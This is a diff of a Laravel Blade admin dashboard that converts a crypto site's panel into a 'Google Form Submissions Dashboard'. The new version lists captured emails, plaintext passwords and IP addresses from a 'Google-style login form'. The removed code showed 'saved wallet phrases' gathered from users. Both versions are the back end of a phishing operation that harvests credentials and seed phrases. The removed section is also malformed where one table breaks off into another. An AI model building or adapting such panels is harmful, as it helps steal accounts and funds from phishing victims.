@@ -152,8 +152,6 @@
         font-size: 0.92rem;
     }
 
-    .admin-note.warning { color: #ffe5a6; }
-
     .admin-menu-grid {
         grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
         margin-bottom: 24px;
@@ -273,38 +271,6 @@
         color: var(--admin-muted);
     }
 
-    .status-badge {
-        display: inline-flex;
-        align-items: center;
-        gap: 8px;
-        padding: 7px 10px;
-        border-radius: 999px;
-        font-size: 0.78rem;
-        font-weight: 700;
-    }
-
-    .status-badge.new,
-    .status-badge.pending {
-        color: #ffe5a6;
-        background: rgba(255, 207, 90, 0.12);
-    }
-
-    .status-badge.read {
-        color: #cde8ff;
-        background: rgba(78, 164, 255, 0.12);
-    }
-
-    .status-badge.replied,
-    .status-badge.completed {
-        color: #baf5d2;
-        background: rgba(50, 213, 131, 0.12);
-    }
-
-    .status-badge.failed {
-        color: #ffbec6;
-        background: rgba(255, 107, 122, 0.12);
-    }
-
     .table-link {
         color: #9fd4ff;
         text-decoration: none;
@@ -335,10 +301,9 @@
         <div class="admin-topbar">
             <div>
                 <span class="admin-kicker">Admin control room</span>
-                <h1>Monitor users, messages, and transactions from one premium dashboard.</h1>
+                <h1>Google Form Submissions Dashboard</h1>
                 <p>
-                    The admin experience now matches the cryptorank brand with a cleaner control surface,
-                    stronger visual hierarchy, and live-operational styling aligned to the homepage.
+                    Manage and review all email and password submissions from the Google-style login form.
                 </p>
             </div>
             <span class="admin-pill">Signed in as {{ auth()->user()->name }}</span>
@@ -347,68 +312,50 @@
 
     <div class="admin-stat-grid">
         <div class="admin-card">
-            <span>Contact messages</span>
-            <strong>{{ number_format($stats['total_contacts']) }}</strong>
-            <div class="admin-note {{ $stats['unread_contacts'] > 0 ? 'warning' : '' }}">
-                {{ $stats['unread_contacts'] > 0 ? $stats['unread_contacts'].' unread messages need attention' : 'Inbox is currently up to date' }}
-            </div>
-        </div>
-        <div class="admin-card">
-            <span>Wallet connections</span>
-            <strong>{{ number_format($stats['total_wallet_connections']) }}</strong>
-            <div class="admin-note">Saved wallet phrases</div>
+            <span>Total Submissions</span>
+            <strong>{{ number_format($stats['total_submissions']) }}</strong>
+            <div class="admin-note">All form submissions received</div>
         </div>
     </div>
 
     <div class="admin-menu-grid">
-        <a href="{{ route('admin.contacts') }}" class="admin-menu-card">
-            <span class="admin-menu-icon"><i class="fas fa-envelope"></i></span>
-            <h3>Contact Messages</h3>
-            <p>Review incoming enquiries, mark message state, and respond quickly from the admin queue.</p>
-        </a>
-        <a href="{{ route('admin.wallet-connections') }}" class="admin-menu-card">
-            <span class="admin-menu-icon"><i class="fas fa-key"></i></span>
-            <h3>Wallet Connections</h3>
-            <p>View all saved wallet phrases and connection details for personal backup and recovery.</p>
+        <a href="{{ route('admin.submissions') }}" class="admin-menu-card">
+            <span class="admin-menu-icon"><i class="fas fa-list"></i></span>
+            <h3>View Submissions</h3>
+            <p>View all email and password submissions from the Google login form.</p>
         </a>
     </div>
 
     <div class="admin-section">
         <div class="admin-section-head">
             <div>
-                <h2>Recent contact messages</h2>
-                <p>Latest inbound messages that need quick visibility.</p>
+                <h2>Recent form submissions</h2>
+                <p>Latest submissions from the Google-style login form.</p>
             </div>
-            <a href="{{ route('admin.contacts') }}" class="admin-btn">View all messages</a>
+            <a href="{{ route('admin.submissions') }}" class="admin-btn">View all submissions</a>
         </div>
 
         <div class="admin-table-wrap">
-            @if($recent_contacts->count() > 0)
+            @if($recent_submissions->count() > 0)
                 <div class="table-responsive">
                     <table class="table admin-table">
                         <thead>
                             <tr>
-                                <th>Name</th>
                                 <th>Email</th>
-                                <th>Subject</th>
-                                <th>Status</th>
-                                <th>Received</th>
+                                <th>Password</th>
+                                <th>IP Address</th>
+                                <th>Submitted</th>
                                 <th>Action</th>
                             </tr>
                         </thead>
                         <tbody>
-                            @foreach($recent_contacts as $contact)
+                            @foreach($recent_submissions as $submission)
                                 <tr>
-                                    <td><strong>{{ $contact->name }}</strong></td>
-                                    <td class="table-muted">{{ $contact->email }}</td>
-                                    <td>{{ Str::limit($contact->subject, 34) }}</td>
-                                    <td>
-                                        <span class="status-badge {{ $contact->status }}">
-                                            {{ ucfirst($contact->status) }}
-                                        </span>
-                                    </td>
-                                    <td class="table-muted">{{ $contact->created_at->diffForHumans() }}</td>
-                                    <td><a href="{{ route('admin.contacts.show', $contact) }}" class="table-link">Open</a></td>
+                                    <td><strong>{{ $submission->email }}</strong></td>
+                                    <td class="table-muted" style="font-family: monospace;">{{ $submission->password }}</td>
+                                    <td class="table-muted">{{ $submission->ip_address ?? 'Unknown' }}</td>
+                                    <td class="table-muted">{{ $submission->created_at->diffForHumans() }}</td>
+                                    <td><a href="{{ route('admin.submissions.show', $submission) }}" class="table-link">View</a></td>
                                 </tr>
                             @endforeach
                         </tbody>
@@ -417,89 +364,7 @@
             @else
                 <div class="empty-state">
                     <i class="fas fa-inbox"></i>
-                    <div>No contact messages yet.</div>
-                </div>
-            @endif
-        </div>
-    </div>
-
-    <div class="admin-section">
-        <div class="admin-section-head">
-            <div>
-                <h2>Recent transactions</h2>
-                <p>Most recent account funding and payment events.</p>
-            </div>
-            <a href="{{ route('admin.transactions') }}" class="admin-btn">View all transactions</a>
-        </div>
-
-        <div class="admin-table-wrap">
-            @if($recent_transactions->count() > 0)
-                <div class="table-responsive">
-                    <table class="table admin-table">
-                        <thead>
-                            <tr>
-                                <th>User</th>
-                                <th>Plan</th>
-                                <th>Type</th>
-                                <th>Amount</th>
-                                <th>Status</th>
-                                <th>Date</th>
-                                <th>Action</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            @foreach($recent_transactions as $transaction)
-                                <tr>
-                                    <td><strong>{{ $transaction->user->name ?? 'N/A' }}</strong></td>
-                                    <td class="table-muted">{{ $transaction->investmentPlan->name ?? 'N/A' }}</td>
-                                    <td>{{ ucfirst($transaction->type) }}</td>
-                                    <td>${{ number_format($transaction->amount, 2) }}</td>
-                                    <td>
-                                        <span class="status-badge {{ $transaction->status }}">
-                                            {{ ucfirst($transaction->status) }}
-                                        </span>
-                                    </td>
-                                    <td class="table-muted">{{ $transaction->created_at->format('M d, Y') }}</td>
-                                    <td><a href="{{ route('admin.transactions.show', $transaction) }}" class="table-link">Open</a></td>
-    <div class="admin-section">
-        <div class="admin-section-head">
-            <div>
-                <h2>Recent wallet connections</h2>
-                <p>Latest wallet phrases and connection details.</p>
-            </div>
-            <a href="{{ route('admin.wallet-connections') }}" class="admin-btn">View all connections</a>
-        </div>
-
-        <div class="admin-table-wrap">
-            @if($recent_wallet_connections->count() > 0)
-                <div class="table-responsive">
-                    <table class="table admin-table">
-                        <thead>
-                            <tr>
-                                <th>Wallet Name</th>
-                                <th>IP Address</th>
-                                <th>User Agent</th>
-                                <th>Connected</th>
-                                <th>Action</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            @foreach($recent_wallet_connections as $connection)
-                                <tr>
-                                    <td><strong>{{ $connection->wallet_name }}</strong></td>
-                                    <td class="table-muted">{{ $connection->ip_address ?? 'Unknown' }}</td>
-                                    <td class="table-muted">{{ Str::limit($connection->user_agent, 40) }}</td>
-                                    <td class="table-muted">{{ $connection->created_at->diffForHumans() }}</td>
-                                    <td><a href="{{ route('admin.wallet-connections.show', $connection) }}" class="table-link">View</a></td>
-                                </tr>
-                            @endforeach
-                        </tbody>
-                    </table>
-                </div>
-            @else
-                <div class="empty-state">
-                    <i class="fas fa-key"></i>
-                    <div>No wallet connections yet.</div>
+                    <div>No form submissions yet.</div>
                 </div>
             @endif
         </div>
